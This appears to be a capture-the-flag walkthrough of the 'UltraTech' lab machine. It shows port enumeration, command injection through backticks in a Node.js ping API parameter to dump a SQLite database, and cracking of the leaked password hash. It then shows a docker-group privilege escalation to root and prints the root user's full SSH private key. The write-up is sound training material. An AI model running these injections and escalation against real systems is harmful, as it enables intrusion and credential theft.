# UltraTech

The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

**UltraTech**

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.

**Your Mission**

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

# [Task 2] It's enumeration time!

After enumerating the services and resources available on this machine, what did you discover?

## #2.1 - Which software is using the port 8081?

Let's run a Nmap scan:

~~~
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Answer: `node.js`

## #2.2 - Which other non-standard port is used?

Apparently, our default Nmap scan didn't reveal all the open ports. Let's do `sudo nmap -sS -sV -p- 10.10.66.69` to scan all ports:

~~~
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:71:D7:2F:E8:3E (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Another port appears in our list: `31331`

## #2.3 - Which software using this port?

Answer: `apache`

## #2.4 - Which GNU/Linux distribution seems to be used?

From the Nmap script, it seems that the host is running Ubuntu.

~~~
OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
~~~

Answer: `Ubuntu`

## #2.5 - The software using the port 8080 is a REST api, how many of its routes are used by the web application?

A "route" in the `node.js` terminology refers to *"determining how an application responds to a client request to a particular endpoint, which is a URI (or path) and a specific HTTP request method (GET, POST, and so on)"* (Source: https://expressjs.com/en/starter/basic-routing.html)

Let's use `wfuzz` to discover hidden routes:

~~~
root@kali:~# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 15 http://10.10.66.89:8081/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.66.89:8081/FUZZ
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                      
===================================================================

[REDACTED]

000002526:   200        0 L      8 W      39 Ch       "auth"
000003633:   500        10 L     61 W     1094 Ch     "ping"
000030796:   500        10 L     61 W     1094 Ch     "Ping"
000084978:   200        0 L      8 W      39 Ch       "Auth"                                                             

Total time: 216.4863
Processed Requests: 220560
Filtered Requests: 220541
Requests/sec.: 1018.817
~~~

2 routes have been discovered: `auth` and `ping`.

# [Task 3] Let the fun begin

Now that you know which services are available, it's time to exploit them!

Did you find somewhere you could try to login? Great!

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly.

## #3.1 - There is a database lying around, what is its filename?

*Hint: Look closely how the API is used. Don't spend too much time on `/auth`, it isn't the only route available.*

**auth**

The first route we found is `auth`. Let's check how it works:

~~~
$ curl -i "http://10.10.100.5:8081/auth"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 39
ETag: W/"27-eyFFXmdQ/Imsneqz2tUSLEVh8vY"
Date: Sat, 20 Jun 2020 05:28:27 GMT
Connection: keep-alive

You must specify a login and a password$ 
~~~

It seems to require a `login` and a `password`. Let's try to provide `auth` with these variables.

~~~
$ curl -i "http://10.10.100.5:8081/auth?login=oops&password=oops"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 19
ETag: W/"13-5BeEbsCKuYi/D6yoiMYWlEvunLM"
Date: Sat, 20 Jun 2020 05:28:16 GMT
Connection: keep-alive

Invalid credentials$ 
~~~

This time, we have a different message (`Invalid credentials`), but we have found the expected variables: `/auth?login=login&password=password`.

As we don't have any valid credentials, we can't authenticate now, so let's check the other route.

**ping**

Now, let's have a look at the second route (`ping`):

~~~
$ curl -s "http://10.10.100.5:8081/ping" | html2text 

    TypeError: Cannot read property 'replace' of undefined  
        at app.get (/home/www/api/index.js:45:29)  
        at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)  
        at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)  
        at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)  
        at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)  
        at /home/www/api/node_modules/express/lib/router/index.js:281:22  
        at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)  
        at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)  
        at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)  
        at /home/www/api/node_modules/cors/lib/index.js:224:17
~~~

This is interesting, because the API is likely expecting a parameter to be provided, and will call `replace` to kind of sanitize it. However, as this parameter is missing, it failed and we had this error.

Let's try to guess the missing parameter. As `auth` was expecting a `login` and `password`, we could assume that `ping` is expecting an `ip`, right? Let's check:

~~~
$ curl -i "http://10.10.100.5:8081/ping?ip=127.0.0.1"
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 251
ETag: W/"fb-cFu2RWHosOjadv694se9YWL5QfE"
Date: Sat, 20 Jun 2020 05:39:04 GMT
Connection: keep-alive

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
~~~

It seems that our assumption was correct. Now, let's see if we can inject some code.

~~~
$ curl -i 'http://10.10.100.5:8081/ping?ip=`ls`'
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 49
ETag: W/"31-HlSQypQjJ8bvYzsasjt4yTZkt90"
Date: Sat, 20 Jun 2020 05:56:01 GMT
Connection: keep-alive

ping: utech.db.sqlite: Name or service not known
~~~

The `ip` parameter is injectable, and passing `ls` disclosed the name of the database: `utech.db.sqlite`

## #3.2 - What is the first user's password hash?

Now, we can get try to get the content of the database. The `sqlite3` package doesn't seem to have been installed on the server, but we are still able to dump the content of the database with `cat`.

~~~
$ curl -i 'http://10.10.100.5:8081/ping?ip=`cat%20utech.db.sqlite`'
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 147
ETag: W/"93-594eIY8lmtfDeu2ln6BdpbW24SI"
Date: Sat, 20 Jun 2020 06:10:50 GMT
Connection: keep-alive

���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
~~~

It seems we have been able to get the r00t's and admin's password hashes: 

account | password hash
---|---
r00t | f357a0c52799563c7c7b76c1e7543a32
admin | 0d0ea5111e3c1def594c1684e3b9be84

Answer: `f357a0c52799563c7c7b76c1e7543a32`

## #3.3 - What is the password associated with this hash?

*Hint: We will, we will *******.txt*

To crack the password, we could either perform a brute force attack ourselves using `hashcat` or `John the Ripper`, or be smarter and check on the Internet (e.g. https://crackstation.net/) if this hash has been cracked already:

!["sqlite-hash.png"](files/sqlite-hash.png)

Answer: `n100906`

# [Task 4] The root of all evil

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

## #4.1 - What are the first 9 characters of the root user's private SSH key?

Now that we have found valid credentials, let's try to connect with them in SSH with `r00t:n100906`. It works!

In the SSH terminal, checking our privileges with `sudo -l` shows that we are not in the sudoers. Now, running `id` informs us that we are in the `docker` group:

~~~
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ which docker
/usr/bin/docker
r00t@ultratech-prod:~$ ls -l /usr/bin/docker
-rwxr-xr-x 1 root root 68631952 Feb 13  2019 /usr/bin/docker
~~~

It seems that there is a `bash` container installed:

~~~
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        15 months ago       15.8MB
~~~

Now, going to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) tells us that docker *"can be used to break out from restricted environments by spawning an interactive system shell"*. Let's try with `bash`:

~~~
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@8baf3018faef:/# whoami
root
~~~

It worked. Now, let's see what we have in `/root`:

~~~
root@8baf3018faef:/# ls -la /root
total 40
drwx------  6 root root 4096 Mar 22  2019 ./
drwxr-xr-x 23 root root 4096 Mar 19  2019 ../
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache/
drwx------  3 root root 4096 Mar 22  2019 .emacs.d/
drwx------  3 root root 4096 Mar 22  2019 .gnupg/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh/
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
~~~

A private message:

~~~
root@8baf3018faef:~# cat /root/private.txt 
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful
~~~

And the SSH private key:

~~~
root@8baf3018faef:~# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
~~~

Answer: `MIIEogIBA`
